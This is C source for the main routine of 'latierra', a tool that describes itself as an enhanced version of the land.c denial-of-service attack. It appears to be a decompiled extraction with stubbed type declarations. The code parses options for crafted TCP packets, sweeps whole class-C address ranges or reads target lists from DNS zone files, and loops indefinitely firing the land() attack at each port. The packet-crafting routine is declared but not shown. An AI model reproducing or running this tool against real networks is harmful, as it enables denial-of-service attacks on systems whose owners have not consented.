#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct TYPE_3__ {int tcp_flags; int window_size; int ip_protocol; int sequence_number; int ttl; char* dest_ip; void* supress_output; void* message_type; } ;
typedef  TYPE_1__ LATIERRA_DATA ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int DEFAULT_FREQUENCY ; 
 int DEFAULT_SEQ ; 
 int DEFAULT_TCPFLAGS ; 
 int DEFAULT_TTL ; 
 int DEFAULT_WINSIZE ; 
 int EOF ; 
 void* FALSE ; 
 int FOR_EVER ; 
 int IP_TCP ; 
 int LIST_FILE ; 
 int TH_ACK ; 
 int TH_FIN ; 
 int TH_PUSH ; 
 int TH_RST ; 
 int TH_SYN ; 
 int TH_URG ; 
 void* TRUE ; 
 int ZONE_FILE ; 
 scalar_t__ access (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  alternatives () ; 
 void* atoi (int*) ; 
 int /*<<< orphan*/ * fopen (char*,char*) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  get_ip (int,int /*<<< orphan*/ *,char*) ; 
 int getopt (int,char**,char*) ; 
 scalar_t__ land (TYPE_1__*,int) ; 
 int /*<<< orphan*/  nslookup_help () ; 
 int* optarg ; 
 int /*<<< orphan*/  print_arguments () ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  protocol_list () ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*,int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int /*<<< orphan*/  strcmp (char*,char*) ; 
 int /*<<< orphan*/  strcpy (char*,...) ; 
 int strlen (int*) ; 
 scalar_t__ strncmp (int*,char*,int) ; 

int main(int argc, char **argv)
{
	FILE *fp;
	LATIERRA_DATA ld;
	int frequency = DEFAULT_FREQUENCY, x;
	int beginning_port=1, octet=1, scan_loop=0, loop_val=0, use_file=FALSE;
	int ending_port = 0, loop = TRUE, i = 0, increment_addr = FALSE;
   char got_ip = FALSE, got_beg_port = FALSE;
	char class_c_addr[21], filename[256], buff[512], valid_tcp_flags[16];

	printf("\nlatierra v1.0b by MondoMan (elmondo@usa.net), KeG\n");
   printf("Enhanced version of land.c originally developed by m3lt, FLC\n");

	strcpy(valid_tcp_flags, "fsrpau");
	ld.tcp_flags = 0;
	ld.window_size = DEFAULT_WINSIZE;
	ld.ip_protocol = IP_TCP;
	ld.sequence_number = DEFAULT_SEQ;
	ld.ttl = DEFAULT_TTL;
	ld.message_type = 0;
	
	if(argc > 1 && (!strcmp(argv[1], "-a")))
		alternatives();

	if(argc > 1 && (!strcmp(argv[1], "-n")))
		nslookup_help();

	if(argc > 1 && (!strcmp(argv[1], "-p")))
		protocol_list();

	if(argc == 1 || ( (argc >= 2) && (!strcmp(argv[1], "-h"))))
		print_arguments();

	while((i = getopt(argc, argv, "i:b:e:s:l:o:t:w:p:q:v:m:")) != EOF)
		{
		switch(i)
			{	
			case 't':
				for(x=0;x<strlen(optarg);x++)
					switch(optarg[x])
						{
						case 'f':                        /* fin */
							ld.tcp_flags |= TH_FIN;
							break;
						case 's':                        /* syn */
							ld.tcp_flags |= TH_SYN;
							break;
						case 'r':                        /* reset */
							ld.tcp_flags |= TH_RST;
							break;
						case 'p':                        /* push */
							ld.tcp_flags |= TH_PUSH;			
							break;
						case 'a':                        /* ack */
							ld.tcp_flags |= TH_ACK;
							break;
						case 'u':                        /* urgent */
							ld.tcp_flags |= TH_URG;
							break;
						default:
							printf("\nERROR: Invalid option specified [ %c ] for tcp_flags.\n\n", optarg[x]);
							return(-12);
							break;
						}
				break;
			case 'q':
				ld.sequence_number = atoi(optarg);
				break;
			case 'w':
				ld.window_size = atoi(optarg);
				break;
			case 'm':
				ld.message_type = atoi(optarg);
				break;
			case 'v':
				ld.ttl = atoi(optarg);
				break;
			case 'p':
				ld.ip_protocol = atoi(optarg);
				break;
			case 'o':
				ld.supress_output = TRUE;
				break;
			case 'i':
				if(strlen(optarg) > 1)
					strcpy(ld.dest_ip, optarg);
				else
					{
					printf("ERROR: Must specify valid IP or hostname.\n");
					return(-6);
					}
				got_ip = TRUE;
				break;
			case 's':
				frequency = atoi(optarg);	
				break;
			case 'l':
				loop = atoi(optarg);
				break;
			case 'b':
				beginning_port = atoi(optarg);
				got_beg_port = TRUE;
				break;
			case 'e':
				ending_port = atoi(optarg);
				break;
			}
		}

	if(!ld.tcp_flags)
		ld.tcp_flags = DEFAULT_TCPFLAGS;

	if(!got_beg_port)
		{
		fprintf(stderr, "\nMust specify beginning port number.  Use -h for help with arguments.\n\n");
		return(-7);
		}

	if(ending_port == 0)
		ending_port = beginning_port;

	printf("\nSettings:\n\n");

   printf("  (-i)   Dest. IP Addr   : ");

	if(ld.dest_ip[strlen(ld.dest_ip) -1] == '-')
		{
		ld.dest_ip[strlen(ld.dest_ip)-1] = 0x0;
		strcpy(class_c_addr, ld.dest_ip);
		strcat(ld.dest_ip, "1");
		printf(" %s (Class C range specified).\n", ld.dest_ip);
		increment_addr = TRUE;
		octet = 1;
		}
	else
		if(strlen(ld.dest_ip) > 5)
			{
			if(strncmp(ld.dest_ip, "zone=", 5)==0)
				{
				strcpy(filename, &ld.dest_ip[5]);
				printf("%s (using DNS zone file)\n", filename);
				use_file = ZONE_FILE;
				}	
			else if(strncmp(ld.dest_ip, "list=", 5) == 0)
				{
				strcpy(filename, &ld.dest_ip[5]);
				printf("%s (using ASCII list)\n", filename);
				use_file = LIST_FILE;
				}
			else
				printf("%s\n", ld.dest_ip);
			}
		else 
			{
			printf("Destination specifier (%s) length must be > 7.\n", ld.dest_ip);
			return(-9);
			}

	printf("  (-b)   Beginning Port #: %d\n",     beginning_port );
	printf("  (-e)   Ending Port #   : %d\n",     ending_port );
	printf("  (-s)   Seconds to Pause: %d\n",     frequency );
	printf("  (-l)   Loop            : %d %s\n",  loop, (loop == FOR_EVER) ? "(forever)" : " " );
	printf("  (-w)   Window size     : %d\n",     ld.window_size );
	printf("  (-q)   Sequence Number : %X (%d)\n",ld.sequence_number, ld.sequence_number );
	printf("  (-v)   Time-to-Live    : %d\n",     ld.ttl);
	printf("  (-p)   IP Protocol #   : %d\n",     ld.ip_protocol );
	printf("  (-t)   TCP flags       : "); 

	strcpy(buff, "");

	if( ld.tcp_flags & TH_FIN)
		strcat(buff, "fin ");
	if( ld.tcp_flags & TH_SYN)
		strcat(buff, "syn ");
	if(ld.tcp_flags & TH_RST)
		strcat(buff, "rst ");
	if(ld.tcp_flags & TH_PUSH)
		strcat(buff, "push ");
	if(ld.tcp_flags & TH_ACK)
		strcat(buff, "ack ");
	if(ld.tcp_flags & TH_URG)
		strcat(buff, "urg ");

	printf("%s\n\n", buff);
			
	if(ending_port < beginning_port)
		{
		printf("\nERROR: Ending port # must be greater than beginning port #\n\n");
		return(-8);
		}
	
	scan_loop = loop_val = loop;
	
	if(use_file)
		{
		if(access(filename, 0))
			{
			printf("\nERROR: The file you specified (%s) cannot be found.\n\n", filename);
			return(-9);
			}

		if( (fp = fopen(filename, "rt")) == NULL)
			{
			printf("ERROR: Unable to open %s.\n", filename);
			return(-10);
			}

		if(!get_ip(use_file, fp, buff))
			{
			printf("Unable to get any IP address from file %s.\n");
			return(-11);
			}

		strcpy(ld.dest_ip, buff);
		}
	
	while( (loop == FOR_EVER) ? 1 : loop-- > 0)
		{
		for(i=beginning_port; i <= ending_port; i++)
			{
			if(land(&ld, i))        /* go for it BaBy! */
				break;

   		if(frequency)          /* make sure freq > 0 */
			 	{
				if(!ld.supress_output)
					printf("-> paused %d seconds.\n", frequency);
				sleep(frequency);
				}
			}

		if( (!use_file) && (loop && increment_addr) )
			{
			char temp_addr[21];

			if(++octet > 254)                        /* check for reset */
				{
				if(loop_val != FOR_EVER)              /* make sure not to distrute forever! */
					{
					if(++scan_loop > loop_val)        /* check if scanned x times */
						break;
					else
						loop = loop_val;                /* restore original value */
					}
				octet = 1;	                          /* reset */
				}

			sprintf(temp_addr, "%s%d", class_c_addr, octet);
			strcpy(ld.dest_ip, temp_addr);
		
			if(!ld.supress_output)
				printf("** incrementing to next IP address: %s\n", ld.dest_ip);

			if(scan_loop > loop_val)
				break;	/* break while loop */
			}
		else if(use_file)
			{
			if(!get_ip(use_file, fp, buff))
				break;
		
			loop++;

			strcpy(ld.dest_ip, buff);
			}

		} /* end while */

	printf("\nDone.\n\n");
}